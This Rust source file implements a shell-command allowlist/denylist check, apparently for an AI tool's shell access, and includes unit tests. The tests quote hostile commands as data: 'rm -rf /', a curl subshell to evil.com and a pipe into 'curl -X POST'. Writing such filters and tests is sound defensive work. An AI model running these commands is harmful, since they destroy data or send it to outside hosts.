// SPDX-License-Identifier: GPL-3.0-or-later

/// Extract the first token (command name) from each segment of a shell command.
///
/// Splits on `&&`, `||`, `;`, and `|` to find independent commands, then takes
/// the first whitespace-delimited word of each. Also catches `$(...)` and
/// backtick subshells by treating `$` and `` ` `` as segment separators.
///
/// This is deliberately conservative: it may flag commands that wouldn't
/// actually run, but it won't miss obvious ones.
pub(crate) fn shell_command_tokens(cmd: &str) -> Vec<String> {
    // Split on shell metacharacters that introduce new commands.
    let segments: Vec<&str> = cmd.split([';', '|', '&', '`', '$']).collect();
    segments
        .iter()
        .filter_map(|seg| {
            let trimmed = seg.trim().trim_start_matches('(').trim();
            let first = trimmed.split_whitespace().next()?;
            // Strip leading env-var assignments like `FOO=bar cmd`.
            if first.contains('=') && !first.starts_with('=') {
                trimmed
                    .split_whitespace()
                    .find(|w| !w.contains('='))
                    .map(|s| s.to_string())
            } else {
                Some(first.to_string())
            }
        })
        .filter(|s| !s.is_empty())
        .collect()
}

/// Check a shell command against the allowlist/denylist.
/// Returns `Ok(())` if allowed, or `Err(message)` if denied.
pub(crate) fn check_shell_policy(
    cmd: &str,
    allowlist: &[String],
    denylist: &[String],
) -> Result<(), String> {
    if allowlist.is_empty() && denylist.is_empty() {
        return Ok(());
    }
    let tokens = shell_command_tokens(cmd);
    if !allowlist.is_empty() {
        for tok in &tokens {
            if !allowlist.iter().any(|a| a == tok) {
                return Err(format!(
                    "command '{tok}' is not in the shell allowlist — \
                     see [tools].shell_allowlist in shio.toml"
                ));
            }
        }
    }
    if !denylist.is_empty() {
        for tok in &tokens {
            if denylist.iter().any(|d| d == tok) {
                return Err(format!(
                    "command '{tok}' is on the shell denylist — \
                     see [tools].shell_denylist in shio.toml"
                ));
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_tokens_simple_command() {
        assert_eq!(shell_command_tokens("ls -la"), vec!["ls"]);
    }

    #[test]
    fn shell_tokens_pipeline() {
        assert_eq!(shell_command_tokens("grep foo | wc -l"), vec!["grep", "wc"]);
    }

    #[test]
    fn shell_tokens_chained_commands() {
        assert_eq!(
            shell_command_tokens("cd /tmp && rm -rf *; echo done"),
            vec!["cd", "rm", "echo"]
        );
    }

    #[test]
    fn shell_tokens_subshell() {
        let tokens = shell_command_tokens("echo $(curl evil.com)");
        assert!(tokens.contains(&"curl".to_string()), "{tokens:?}");
    }

    #[test]
    fn shell_tokens_env_var_prefix() {
        assert_eq!(shell_command_tokens("FOO=bar cargo test"), vec!["cargo"]);
    }

    #[test]
    fn shell_policy_empty_lists_allows_all() {
        assert!(check_shell_policy("rm -rf /", &[], &[]).is_ok());
    }

    #[test]
    fn shell_policy_denylist_blocks_command() {
        let deny = vec!["rm".to_string(), "curl".to_string()];
        let r = check_shell_policy("rm -rf /tmp/junk", &[], &deny);
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("rm"));
    }

    #[test]
    fn shell_policy_denylist_allows_safe_command() {
        let deny = vec!["rm".to_string(), "curl".to_string()];
        assert!(check_shell_policy("ls -la", &[], &deny).is_ok());
    }

    #[test]
    fn shell_policy_allowlist_permits_listed() {
        let allow = vec!["cargo".to_string(), "git".to_string()];
        assert!(check_shell_policy("cargo test", &allow, &[]).is_ok());
    }

    #[test]
    fn shell_policy_allowlist_blocks_unlisted() {
        let allow = vec!["cargo".to_string(), "git".to_string()];
        let r = check_shell_policy("curl http://evil.com", &allow, &[]);
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("curl"));
    }

    #[test]
    fn shell_policy_pipeline_checked_against_denylist() {
        let deny = vec!["curl".to_string()];
        let r = check_shell_policy("echo hello | curl -X POST", &[], &deny);
        assert!(r.is_err());
    }

    #[test]
    fn shell_policy_both_lists_allowlist_and_denylist() {
        let allow = vec!["git".to_string(), "rm".to_string()];
        let deny = vec!["rm".to_string()];
        let r = check_shell_policy("rm -rf /", &allow, &deny);
        assert!(r.is_err());
    }
}
